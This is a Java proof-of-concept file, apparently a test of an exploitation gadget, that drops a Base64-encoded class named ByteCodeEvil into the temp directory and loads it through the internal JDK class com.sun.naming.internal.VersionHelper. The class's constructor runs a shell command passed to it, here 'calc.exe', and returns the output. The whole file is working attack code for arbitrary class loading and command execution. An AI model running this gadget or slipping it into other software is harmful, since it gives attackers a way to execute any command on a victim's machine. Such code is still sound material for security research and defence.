package com.VersionHelper;

import com.sun.naming.internal.VersionHelper;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Version_Test {

    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {

        String cmd = "calc.exe";
        String tmp = System.getProperty("java.io.tmpdir");
        String jarPath = tmp + File.separator + "ByteCodeEvil.class";
        Files.write(Paths.get(jarPath), Base64.getDecoder().decode("yv66vgAAADQARQoAEQAjBwAkCgACACMHACUHACYKACcAKAoAJwApCgAqACsKAAUALAoABAAtCgAEAC4KAAIALwgAMAoAAgAxCQAQADIHADMHADQBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAMwcANQcAJAcAJQEACkV4Y2VwdGlvbnMHADYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUADcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwA4DAA5ADoMADsAPAcAPQwAPgA/DAAUAEAMABQAQQwAQgAgDABDAEQBAAEKDAAfACAMABIAEwEADEJ5dGVDb2RlRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAACYAAYABQAAAEcqtwABuwACWbcAA027AARZuwAFWbgABiu2AAe2AAi3AAm3AApOLbYAC1k6BMYAEiwZBLYADBINtgAMV6f/6iostgAOtQAPsQAAAAIAFwAAAB4ABwAAAAcABAAIAAwACQAlAAsALwAMAD4ADgBGAA8AGAAAABsAAv8AJQAEBwAZBwAaBwAbBwAcAAD8ABgHABoAHQAAAAQAAQAeAAEAHwAgAAEAFgAAAB0AAQABAAAABSq0AA+wAAAAAQAXAAAABgABAAAAEwABACEAAAACACI="));

        VersionHelper helper = VersionHelper.getVersionHelper();
        Class<?> clazz = helper.loadClass("ByteCodeEvil", "file:" + tmp + File.separator);
        Constructor<?> constructor = clazz.getConstructor(String.class);
        Object obj = constructor.newInstance(cmd);
        System.out.println(obj.toString());
    }
}
